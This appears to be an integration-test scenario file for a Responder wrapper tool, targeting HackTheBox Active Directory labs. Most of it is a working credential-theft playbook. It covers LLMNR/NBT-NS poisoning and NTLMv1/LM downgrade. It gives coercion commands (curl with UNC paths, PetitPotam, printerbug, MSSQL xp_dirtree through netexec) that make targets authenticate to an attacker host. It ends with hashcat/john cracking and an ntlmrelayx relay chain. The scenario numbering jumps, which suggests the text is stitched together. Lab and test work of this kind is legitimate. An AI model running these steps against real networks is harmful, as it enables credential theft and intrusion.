# Integration Scenarios: responder
# Required: HTB VPN connection, internal AD network with Windows clients
# Suitable HTB Machines (Active Directory with LLMNR/NBT-NS enabled):
#   - Certified (medium, AD, LLMNR active, exploitable ACLs, good for full chain)
#   - Manager (medium, AD, LLMNR active on domain segment, MSSQL + hash capture)
#   - Escape (medium, AD, SMB + MSSQL, good for capture_smb via SSRF)
#   - Support (easy, AD, basic hash capture, good starting box)
#   - Intelligence (medium, AD, LDAP + SMB, good for WPAD + analyze scenarios)
#   - Scrambled (medium, AD, multiple protocols, good for multi-hash capture)
# Prerequisites: VPN connected, tun0 interface active, target network reachable
# IMPORTANT: Responder requires --privileged and --network=host. The MCPTestClient
# handles this automatically (responder is in PRIVILEGED_TOOLS).
# Run with: pytest tests/tools/test_responder.py -m integration --tool=responder -v
#
# Recommended HTB box: Escape (medium, AD, MSSQL SSRF triggers SMB auth to attacker,
#   confirmed hash capture via xp_dirtree, also has network-level LLMNR traffic)
#   Alternatives: Manager (MSSQL + SSRF trigger), Support (easy, basic LLMNR capture),
#                 Intelligence (WPAD scenario with DNS + printer abuse)
#
# 3 methods: poison, analyze, capture_smb
# Note: Responder needs broadcast traffic on the network. HTB AD labs have varying
#   levels of LLMNR/NBT-NS traffic. SSRF-triggered capture (capture_smb) is the most
#   reliable on HTB because it doesn't depend on passive broadcast traffic.

# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 1: Passive Analysis — Assess broadcast protocol activity
# Goal: Determine if LLMNR/NBT-NS/MDNS traffic exists on the network before poisoning
# Phase: Reconnaissance
# ═══════════════════════════════════════════════════════════════════════════════

## Step 1: Run passive analysis on VPN interface
Method: analyze
Args: {interface: "tun0", duration: 60, verbose: true}
Expected: success=true, detected_protocols may contain LLMNR/NBT-NS requests
Notes: Safe — no poisoning, no responses sent. Just listens for broadcast name
  resolution queries. Run for 60s minimum to capture intermittent traffic.
  On an AD network with Windows clients, you should see LLMNR requests for
  hostnames that DNS cannot resolve (typos, old NetBIOS names, decommissioned hosts).

## Step 2: Analyze results
Expected output fields:
  - detected_protocols: Array of log lines from Analyzer-Session.log
  - detection_count: Number of observed events
  - interface_used: "tun0"
Decision: If detection_count > 0, proceed to poisoning (Scenario 2).
  If detection_count == 0 after 60s, try longer duration (120s) or verify
  network segment has Windows clients.

# SCENARIO 2: LLMNR/NBT-NS Poisoning — Capture NTLMv2 hashes
# Goal: Poison broadcast name resolution to capture domain user NTLMv2 hashes
# Phase: Exploitation
# Prerequisite: Scenario 1 confirmed LLMNR/NBT-NS traffic exists
# ═══════════════════════════════════════════════════════════════════════════════

## Step 1: Run full poisoning mode
Method: poison
Args: {interface: "tun0", duration: 300, verbose: true}
Expected: success=true, hash_count >= 1
Notes: Runs all 18 rogue servers + LLMNR/NBT-NS/MDNS poisoning. Duration 300s
  (5 min) gives enough time for clients to query non-existent hostnames.
  Watch for failed_ports in result — if ports are already in use, some
  protocols may not capture hashes.

## Step 2: Verify captured hashes
Expected output fields:
  - captured_hashes: Array of hash objects with module, hash_type, username, hash
  - hash_count: Number of unique captured hashes
  - copied_files: Paths to /session/responder/ where hashes are persisted
Hash format: username::DOMAIN:challenge:ntproofstr:blob (hashcat mode 5600)
Follow-up: Crack with john/hashcat. Example:
  john --format=netntlmv2 /session/responder/SMB-NTLMv2-SSP-<IP>.txt
  hashcat -m 5600 /session/responder/SMB-NTLMv2-SSP-<IP>.txt wordlist.txt

## Step 3: Verify hash file persistence
Check: copied_files should list files in /session/responder/
  - SMB-NTLMv2-SSP-<client_ip>.txt — SMB hashes
  - HTTP-NTLMv2-<client_ip>.txt — HTTP hashes (if any)
  - Responder.db — SQLite database with all captured data
  - Responder-Session.log — Full session log

# SCENARIO 3: SMB Hash Capture via SSRF / Coerced Authentication
# Goal: Capture NTLMv2 hash from a server-side request (SSRF or coerced auth)
# Phase: Exploitation
# Prerequisite: Have an SSRF vulnerability or coercion primitive (PetitPotam, etc.)
# ═══════════════════════════════════════════════════════════════════════════════

## Step 1: Start SMB-only capture
Method: capture_smb
Args: {interface: "tun0", duration: 30, verbose: true}
Expected: success=true (even with hash_count=0 if trigger hasn't fired yet)
Notes: Disables all poisoners and all servers except SMB (port 445).
  This is the cleanest mode for SSRF capture — no broadcast poisoning noise.
  Config backup/restore cycle is automatic.

## Step 2: Trigger SSRF (in parallel or before capture)
Trigger example: curl to vulnerable endpoint with UNC path
  curl http://<target>/vulnerable?file=\\<attacker_tun0_ip>\share
  Or: PetitPotam.py <attacker_tun0_ip> <dc_ip> -u user -p pass
  Or: printerbug.py domain/user:pass@<dc_ip> <attacker_tun0_ip>
Timing: Start capture_smb FIRST, then trigger within the duration window.
  For SSRF: duration 15-30s is enough (response is immediate).
  For coerced auth: duration 60s+ (may take time for the DC to connect back).

## Step 3: Verify SMB hash capture
Expected output fields:
  - captured_hashes: Should contain SMB NTLMv2-SSP hash from the target machine
  - smb_only: true (confirms only SMB was active)
  - hash_count: Should be >= 1 if SSRF trigger worked
Machine account hash format: MACHINE$::DOMAIN:challenge:ntproofstr:blob
  Machine account hashes from PetitPotam/PrinterBug can be relayed with
  ntlmrelayx (cannot be cracked — machine passwords are random 128 chars).

# SCENARIO 4: MSSQL xp_dirtree Triggered SMB Capture
# Goal: Capture NTLMv2 hash via MSSQL xp_dirtree SSRF
# Phase: Exploitation
# Prerequisite: MSSQL access (even low-priv) on the target
# ═══════════════════════════════════════════════════════════════════════════════

## Step 1: Start SMB-only capture
Method: capture_smb
Args: {interface: "tun0", duration: 30, verbose: true}
Expected: success=true, SMB listener active

## Step 2: Trigger via MSSQL (use netexec mssql method)
Trigger: netexec mssql <target> -u <user> -p <pass> -q "EXEC xp_dirtree '\\<attacker_tun0_ip>\share'"
  Or: netexec mssql <target> -u <user> -p <pass> -q "EXEC master.dbo.xp_subdirs '\\<attacker_tun0_ip>\share'"
Notes: xp_dirtree and xp_subdirs cause the SQL Server service account to authenticate
  to the attacker's SMB listener. This works with ANY MSSQL user — no sysadmin required.
  The captured hash is the SQL Server service account (often a domain user or SYSTEM).

## Step 3: Verify capture
Expected: hash_count >= 1, hash contains SQL service account name
Follow-up: If service account hash is crackable, use creds for further enumeration.
  If machine account (MACHINE$), relay with ntlmrelayx instead of cracking.
HTB Machines: Escape (confirmed MSSQL SSRF → hash capture), Manager, DarkZero

# SCENARIO 7: NTLMv1 Downgrade for Faster Cracking
# Goal: Force NTLMv1 responses for faster offline cracking
# Phase: Exploitation
# ═══════════════════════════════════════════════════════════════════════════════

## Step 1: Run poisoning with ESS disabled
Method: poison
Args: {interface: "tun0", duration: 300, verbose: true, disable_ess: true}
Expected: success=true, captured_hashes with hash_type containing "NTLMv1"
Notes: Disables Extended Session Security to force NTLMv1 downgrade.
  NTLMv1 hashes (hashcat mode 5500) crack MUCH faster than NTLMv2 (mode 5600).
  Only works if the client's NTLMMinClientSec policy allows NTLMv1.
  Modern hardened Windows may refuse to downgrade.

## Step 2: Run poisoning with LM downgrade (legacy networks)
Method: poison
Args: {interface: "tun0", duration: 300, verbose: true, lm_downgrade: true}
Expected: success=true, captured_hashes with LM hash type
Notes: Forces LM hashing (even weaker than NTLMv1). Only works on
  very old Windows clients (XP, Server 2003). Unlikely on modern HTB boxes.

# SCENARIO 15: Responder + ntlmrelayx Chain (Relay instead of Crack)
# Goal: Relay captured NTLM auth to a target with SMB signing disabled
# Phase: Exploitation (multi-tool)
# Prerequisite: At least one host with SMB signing not required
# ═══════════════════════════════════════════════════════════════════════════════

## Step 1: Identify relay targets (use netexec)
Pre-check: netexec smb <subnet>/24 --gen-relay-list /session/artifacts/relay_targets.txt
Expected: List of hosts with SMB signing disabled/not required
Notes: Only hosts with "signing:False" can be relayed to. DCs always require signing.

## Step 2: Start ntlmrelayx (use impacket-relay tool)
Parallel: impacket ntlmrelayx -tf /session/artifacts/relay_targets.txt -smb2support
Notes: ntlmrelayx listens on port 445 — Responder's SMB must be OFF.

## Step 3: Start Responder with SMB disabled
Method: poison
Args: {interface: "tun0", duration: 300, verbose: true}
Pre-config: Manually disable SMB in Responder.conf (set SMB = Off)
  Or use capture_smb=false (not directly supported — need to edit config manually).
Notes: Responder poisons LLMNR/NBT-NS, clients connect to attacker on port 445,
  ntlmrelayx relays the auth to the real target. No cracking needed.
  This is the most powerful attack when SMB signing is not enforced.

## Step 4: Alternative — use external_ip for relay split
Method: poison
Args: {interface: "tun0", duration: 300, verbose: true, external_ip: "<ntlmrelayx_ip>"}
Notes: Point poisoned responses directly at the ntlmrelayx listener.
  No need to disable SMB in Responder — clients connect to ntlmrelayx's IP directly.

## Scenario 19: Port 445 conflict (SMB service running)
Method: poison
Args: {interface: "tun0", duration: 60, verbose: true}
Expected: success=true (partial), failed_ports contains 445
Notes: If an SMB service (smbd, samba) is running on the host, Responder can't
  bind to port 445. The result will show failed_ports=[445] but other
  protocols (HTTP, LDAP, etc.) still capture hashes.
  error_class=config, retryable=true.
Fix: Stop conflicting service or use capture_smb with --privileged (kills existing bindings).

## Scenario 20: Port 80 conflict (web server running)
Method: poison
Args: {interface: "tun0", duration: 60, verbose: true}
Expected: success=true (partial), failed_ports contains 80
Notes: If Apache/nginx is running, HTTP capture fails but SMB/LLMNR still works.
  Use capture_smb mode if only SMB hashes are needed.

## Scenario 21: Multiple port conflicts
Method: poison
Args: {interface: "tun0", duration: 60, verbose: true}
Expected: success=true (partial), failed_ports contains multiple ports
Notes: In heavily-used containers, multiple ports may conflict. Check failed_ports
  array and assess which protocols are still functional.
  Agent should log which protocols are impacted and adjust expectations.

## Scenario 22: SMB port conflict on capture_smb (complete failure)
Method: capture_smb
Args: {interface: "tun0", duration: 30, verbose: true}
Expected: success=false, error mentions port 445
Notes: For capture_smb, port 445 is the ONLY server. If it fails, the entire
  capture is useless. The server returns success=false with error_class=config.
  Fix: ensure --privileged and --network=host, stop conflicting SMB services.

## Step 2: Interpret protocol types
Analysis of detected_protocols array:
  - Lines containing "LLMNR": Link-Local Multicast Name Resolution (IPv4/IPv6, UDP 5355)
  - Lines containing "NBT-NS": NetBIOS Name Service (IPv4 only, UDP 137)
  - Lines containing "MDNS": Multicast DNS (Apple/Linux discovery, UDP 5353)
  - Lines containing "Browser": Windows Browser protocol (network shares discovery)
Decision matrix:
  - LLMNR detected → standard poisoning should work
  - Only NBT-NS → older clients, may get NTLMv1 with disable_ess
  - MDNS → Linux/Mac clients on network, may capture different credentials
  - No traffic → LLMNR disabled by GPO, try DHCPv6 or WPAD instead

## Port binding errors
Symptom: failed_ports in result, error_class="config", retryable=true
Cause: Another service is using the same port (e.g., smbd on 445, apache on 80)
Fix: Stop conflicting services, or use capture_smb for SMB-only mode

## No hashes captured
Possible causes:
  1. No Windows clients on the network segment (LLMNR is Windows-only)
  2. LLMNR/NBT-NS disabled by Group Policy (modern hardened environments)
  3. Network segmentation — attacker not on the same broadcast domain
  4. Duration too short — increase to 300-540s for passive capture
  5. HTB lab may not have active broadcast traffic — use SSRF trigger instead
Fix: Try analyze mode first to verify broadcast traffic exists.
  If no broadcast traffic, use capture_smb with xp_dirtree/PetitPotam/PrinterBug trigger.

## Permission errors
Symptom: error_class="permission", retryable=false
Cause: Container not running with --privileged
Fix: MCPTestClient handles this automatically (responder in PRIVILEGED_TOOLS).
  For manual testing: docker run --privileged --network=host ...

## Interface not found
Symptom: error_class="config", "not found" in error
Cause: Specified interface does not exist in the container
Fix: Use auto-detection (omit interface param) or check with 'ip link'

## Config backup/restore issues
Symptom: capture_smb leaving modified Responder.conf
Cause: Exception in _write_smb_only_config before backup, or restore failure
Fix: The finally block in capture_smb always restores config. If Responder.conf.bak
  exists after a run, something went wrong — manual restore needed.

## Hash file parsing failures
Symptom: hash_count=0 but hashes visible in raw_output
Cause: Responder.db may be locked (SQLite contention after SIGTERM)
Fix: The server has a 5-second SQLite timeout. If DB parsing fails, it falls back to
  file-based parsing (NTLMv*.txt files). Both methods are tried automatically.
